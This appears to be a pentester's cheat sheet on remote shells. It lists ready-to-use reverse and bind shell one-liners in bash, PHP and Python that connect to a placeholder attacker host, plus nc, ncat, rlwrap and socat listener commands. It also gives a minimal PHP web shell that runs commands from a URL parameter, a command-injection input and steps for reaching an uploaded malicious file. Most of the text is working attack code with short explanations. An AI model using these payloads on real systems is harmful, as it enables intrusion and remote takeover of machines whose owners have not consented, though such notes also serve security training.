# Reverse Shells

it uses a payload and a listener to establish a connection between the target machine and the attacker's machine. The payload is executed on the target machine, which then connects back to the attacker's machine, allowing the attacker to gain control over the target system.

Example with a `Pipe Reverse Shell`:
On the target machine :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f # Pipe reverse shell
```

On the Attacker machine :
```bash
nc -lvnp <ATTACKER_PORT> # Listener
```

# Bind Shells

It uses a payload to open a listening port on the target machine, allowing the attacker to connect to it and gain control over the system.

Example with a `Pipe Bind Shell`:
On the target machine :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f # listening on port 8080
```

On the Attacker machine :
```bash
nc <TARGET_IP> 8080 # Connect to the target machine via port 8080
```

# Shell listeners

A shell listener is a tool permitting to listen for incoming connections from a reverse shell. It is used by attackers to receive connections from compromised systems and gain control over them.

**rlwarp** : permit to wrap the shell output
```bash
rlwrap nc -lvnp <ATTACKER_PORT> # Listener with rlwrap
```

**Ncat** : a network utility that can be used to listen for incoming connections and establish a shell session with the target machine.
```bash
ncat -lvnp <ATTACKER_PORT> # Listener with ncat
```
- -l : listen mode
- -v : verbose mode
- -n : numeric-only IP addresses ==> prevents DNS resolution
- -p : local port number to listen on

Useful options for the listener:
- --ssl : enable SSL encryption for the listener

**Socat** : a network utility that can be used to create a bidirectional data channel between two endpoints.
```bash
socat -d -d TCP-LISTEN:<ATTACKER_PORT> STDOUT # Listener with socat
```
-d : increase verbosity level

# Shell Payloads

It is a piece of code that is executed on the target machine to establish a connection back to the attacker's machine. It can be used to gain control over the target system and execute commands remotely.

Examples of shell payloads:
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
# PHP
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
# Python
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'  
```

# Web Shells

A web shell is a script that can be uploaded to a web server to enable remote administration of the machine. It allows attackers to execute commands on the server and gain control over it.

To upload a web shell, the attacker needs to find a vulnerability in the web application that allows file uploads.
*Example :*
- *Unrestricted file upload : The application allows users to upload any type of file without proper validation.*
- *File inclusion : The application allows users to include files from the server without proper validation, which can lead to remote code execution.*
- *Command injection : The application allows users to execute system commands without proper validation, which can lead to remote code execution.*

Example of a simple PHP web shell:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
And then in the browser, you can execute commands by accessing the URL:
```
http://target.com/shell.php?cmd=ls
```

Tools to generate web shells:
- `p0wny shell` : a simple PHP web shell generator
- `pentestmonkey` : a web shell generator that supports multiple languages (PHP, ASP, JSP, etc.)


## Command Injection
Command injection is a vulnerability that allows an attacker to execute arbitrary commands on the target system.

For example, if a web application takes user input, the attacker can inject malicious commands by simply using special characters like `;`, `&&`, or `|` to chain commands together.

```
# inside a text input field
hi ; <ATTACKER_PAYLOAD> ;
```

# Unrestricted File Upload
Unrestricted file upload is a vulnerability that allows an attacker to upload arbitrary files to the target system. This can lead to remote code execution if the uploaded file is a web shell or a malicious script

After uploading the file, simply access it via the web server to execute the payload.
```
# accessing the uploaded file
http://target.com/uploads/malicious.php
```